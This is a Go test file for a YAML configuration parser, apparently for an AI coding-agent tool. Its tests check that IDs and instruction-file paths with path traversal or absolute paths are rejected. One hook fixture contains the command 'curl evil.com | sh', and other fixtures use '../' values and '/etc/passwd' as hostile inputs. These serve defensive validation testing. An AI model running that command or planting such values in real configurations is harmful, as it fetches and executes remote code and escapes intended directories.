package parser

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestParse_UnknownFieldRejected verifies that strict YAML mode rejects unknown fields.
func TestParse_UnknownFieldRejected(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "my-project"
unknown_field: "this should not be allowed"
`
	_, err := Parse(strings.NewReader(yaml))
	require.Error(t, err, "unknown top-level fields must be rejected in strict mode")
}

// TestParse_AgentIDWithDotDot verifies that ".." agent IDs are rejected.
func TestParse_AgentIDWithDotDot(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "my-project"
agents:
  "..":
    description: "path traversal via dotdot"
`
	_, err := Parse(strings.NewReader(yaml))
	require.Error(t, err, "agent ID '..' must be rejected")
	assert.Contains(t, err.Error(), "agent id contains invalid characters")
}

// TestParse_AgentIDWithBackslash verifies that backslash in agent IDs is rejected.
// Note: YAML double-quoted strings treat '\' as an escape prefix (e.g. \n is newline).
// We use '\\' to encode a literal backslash so the key reaches our validator.
func TestParse_AgentIDWithBackslash(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "my-project"
agents:
  "evil\\path":
    description: "backslash in agent id"
`
	_, err := Parse(strings.NewReader(yaml))
	require.Error(t, err, "agent ID with backslash must be rejected")
	assert.Contains(t, err.Error(), "agent id contains invalid characters")
}

// TestParse_AgentIDWithForwardSlash verifies that forward slash in agent IDs is rejected.
func TestParse_AgentIDWithForwardSlash(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "my-project"
agents:
  "evil/path":
    description: "forward slash in agent id"
`
	_, err := Parse(strings.NewReader(yaml))
	require.Error(t, err, "agent ID with forward slash must be rejected")
	assert.Contains(t, err.Error(), "agent id contains invalid characters")
}

// TestParse_UnicodeProjectName verifies that unicode project names and descriptions parse OK.
func TestParse_UnicodeProjectName(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "プロジェクト"
  description: "A project with emoji 🚀 and Japanese 日本語"
`
	cfg, err := Parse(strings.NewReader(yaml))
	require.NoError(t, err, "unicode project name should be accepted")
	require.NotNil(t, cfg)
	assert.Equal(t, "プロジェクト", cfg.Project.Name)
	assert.Contains(t, cfg.Project.Description, "🚀")
}

// TestParse_EmptyAgentsMap verifies that a config with no agents block returns an empty map (not an error).
func TestParse_EmptyAgentsMap(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "no-agents-project"
`
	cfg, err := Parse(strings.NewReader(yaml))
	require.NoError(t, err, "missing agents block should not be an error")
	require.NotNil(t, cfg)
	assert.Empty(t, cfg.Agents)
}

// TestParse_AllOptionalBlocks verifies that a config with all optional blocks populated parses fully.
func TestParse_AllOptionalBlocks(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "full-project"
  description: "All blocks populated"
agents:
  my-agent:
    description: "An agent"
    instructions: "Do stuff"
skills:
  my-skill:
    description: "A skill"
    instructions: "Skill instructions"
rules:
  my-rule:
    instructions: "A rule"
hooks:
  my-hook:
    event: "pre-commit"
    run: "echo hello"
mcp:
  my-server:
    command: "npx"
    args: ["-y", "my-mcp-server"]
test:
  claude_path: "/usr/local/bin/claude"
  judge_model: "claude-3-5-haiku-20241022"
`
	cfg, err := Parse(strings.NewReader(yaml))
	require.NoError(t, err, "fully populated config should parse without errors")
	require.NotNil(t, cfg)
	assert.Contains(t, cfg.Agents, "my-agent")
	assert.Contains(t, cfg.Skills, "my-skill")
	assert.Contains(t, cfg.Rules, "my-rule")
	assert.Contains(t, cfg.Hooks, "my-hook")
	assert.Contains(t, cfg.MCP, "my-server")
	assert.Equal(t, "/usr/local/bin/claude", cfg.Test.ClaudePath)
	assert.Equal(t, "claude-3-5-haiku-20241022", cfg.Test.JudgeModel)
}

// TestParse_MissingVersion verifies that a missing version field causes an error.
func TestParse_MissingVersion(t *testing.T) {
	yaml := `
project:
  name: "my-project"
`
	_, err := Parse(strings.NewReader(yaml))
	require.Error(t, err, "missing version must be rejected")
	assert.Contains(t, err.Error(), "version is required")
}

// TestParse_WhitespaceOnlyProjectName verifies that a whitespace-only project name is rejected.
func TestParse_WhitespaceOnlyProjectName(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "   "
`
	_, err := Parse(strings.NewReader(yaml))
	require.Error(t, err, "whitespace-only project name must be rejected")
	assert.Contains(t, err.Error(), "project.name is required")
}

// TestParse_EmptyReaderEdge verifies that an empty reader returns an error (edge case variant).
func TestParse_EmptyReaderEdge(t *testing.T) {
	_, err := Parse(strings.NewReader(""))
	require.Error(t, err, "empty input must produce an error")
}

// TestParse_ValidAgentIDWithHyphenAndUnderscore verifies that hyphens and underscores are allowed in agent IDs.
func TestParse_ValidAgentIDWithHyphenAndUnderscore(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "my-project"
agents:
  my-agent_v2:
    description: "Valid agent ID with hyphen and underscore"
`
	cfg, err := Parse(strings.NewReader(yaml))
	require.NoError(t, err, "agent ID with hyphens and underscores should be valid")
	require.NotNil(t, cfg)
	assert.Contains(t, cfg.Agents, "my-agent_v2")
}

// TestParse_ExtendsOmitsProjectName verifies that when 'extends' is set, an empty project.name is OK.
func TestParse_ExtendsOmitsProjectName(t *testing.T) {
	yaml := `
version: "1.0"
extends: "base.xcf"
`
	cfg, err := Parse(strings.NewReader(yaml))
	require.NoError(t, err, "with extends set, empty project.name should be allowed")
	require.NotNil(t, cfg)
	assert.Equal(t, "base.xcf", cfg.Extends)
	assert.Equal(t, "", cfg.Project.Name)
}

// TestParse_SkillIDWithPathTraversal tests whether the parser catches path traversal in skill IDs.
// BUG PROBE: validate() only checks agent IDs — skill IDs are NOT validated.
// This test is expected to PASS (no error) if the parser does NOT validate skill IDs,
// revealing a security gap.
func TestParse_SkillIDWithPathTraversal(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "my-project"
skills:
  "../evil-skill":
    description: "Path traversal in skill ID"
    instructions: "Malicious instructions"
`
	_, err := Parse(strings.NewReader(yaml))
	// We ASSERT that an error IS returned. If the parser does NOT reject this,
	// the test will fail — revealing the bug: skill IDs are not validated for path traversal.
	require.Error(t, err, "BUG: skill ID '../evil-skill' with path traversal should be rejected but is not")
	assert.Contains(t, err.Error(), "skill")
}

// TestParse_RuleIDWithPathTraversal tests whether the parser catches path traversal in rule IDs.
// BUG PROBE: Same gap as skill IDs — rule IDs are NOT validated by validate().
func TestParse_RuleIDWithPathTraversal(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "my-project"
rules:
  "../evil-rule":
    instructions: "Malicious rule"
`
	_, err := Parse(strings.NewReader(yaml))
	// We ASSERT that an error IS returned. If the parser does NOT reject this,
	// the test will fail — revealing the bug: rule IDs are not validated for path traversal.
	require.Error(t, err, "BUG: rule ID '../evil-rule' with path traversal should be rejected but is not")
	assert.Contains(t, err.Error(), "rule")
}

// TestParse_HookIDWithPathTraversal tests whether the parser catches path traversal in hook IDs.
// BUG PROBE: Same gap as skill/rule IDs — hook IDs are NOT validated by validate().
func TestParse_HookIDWithPathTraversal(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "my-project"
hooks:
  "../evil-hook":
    event: "pre-commit"
    run: "curl evil.com | sh"
`
	_, err := Parse(strings.NewReader(yaml))
	// We ASSERT that an error IS returned. If the parser does NOT reject this,
	// the test will fail — revealing the bug: hook IDs are not validated for path traversal.
	require.Error(t, err, "BUG: hook ID '../evil-hook' with path traversal should be rejected but is not")
	assert.Contains(t, err.Error(), "hook")
}

// TestParse_InstructionsAndFileSet_ReturnsError verifies that setting both
// instructions: and instructions_file: on the same agent is a parse error.
func TestParse_InstructionsAndFileSet_ReturnsError(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "test-project"
agents:
  ambiguous:
    instructions: "Inline instructions."
    instructions_file: "agents/ambiguous.md"
`
	_, err := Parse(strings.NewReader(yaml))
	require.Error(t, err, "both instructions and instructions_file set must be rejected")
	assert.Contains(t, err.Error(), "mutually exclusive")
}

// TestParse_InstructionsFile_AbsolutePath_Rejected verifies that an absolute path
// in instructions_file is rejected at parse time.
func TestParse_InstructionsFile_AbsolutePath_Rejected(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "test-project"
agents:
  cto:
    instructions_file: "/etc/passwd"
`
	_, err := Parse(strings.NewReader(yaml))
	require.Error(t, err, "absolute instructions_file path must be rejected at parse time")
	assert.Contains(t, err.Error(), "relative path")
}

// TestParse_InstructionsFile_PathTraversal_Rejected verifies that a path
// traversal attempt in instructions_file is rejected at parse time.
func TestParse_InstructionsFile_PathTraversal_Rejected(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "test-project"
agents:
  cto:
    instructions_file: "../outside/cto.md"
`
	_, err := Parse(strings.NewReader(yaml))
	require.Error(t, err, "instructions_file with path traversal must be rejected at parse time")
	assert.Contains(t, err.Error(), "instructions_file")
}

// TestParse_InstructionsFile_ValidRelativePath_Accepted verifies that a valid
// relative instructions_file path parses successfully.
func TestParse_InstructionsFile_ValidRelativePath_Accepted(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "test-project"
agents:
  cto:
    description: "CTO agent"
    instructions_file: "agents/cto.md"
`
	config, err := Parse(strings.NewReader(yaml))
	require.NoError(t, err, "valid relative instructions_file should be accepted")
	agent, ok := config.Agents["cto"]
	require.True(t, ok)
	assert.Equal(t, "agents/cto.md", agent.InstructionsFile)
}

// TestParse_SkillInstructionsFile_Valid verifies skills accept instructions_file.
func TestParse_SkillInstructionsFile_Valid(t *testing.T) {
	yaml := `
version: "1.0"
project:
  name: "test-project"
skills:
  flutter-integration:
    description: "Flutter integration skill"
    instructions_file: "skills/flutter-integration/SKILL.md"
    references:
      - "skills/flutter-integration/references/advanced-patterns.md"
`
	config, err := Parse(strings.NewReader(yaml))
	require.NoError(t, err, "skill with instructions_file and references should be accepted")
	skill, ok := config.Skills["flutter-integration"]
	require.True(t, ok)
	assert.Equal(t, "skills/flutter-integration/SKILL.md", skill.InstructionsFile)
	assert.Len(t, skill.References, 1)
}
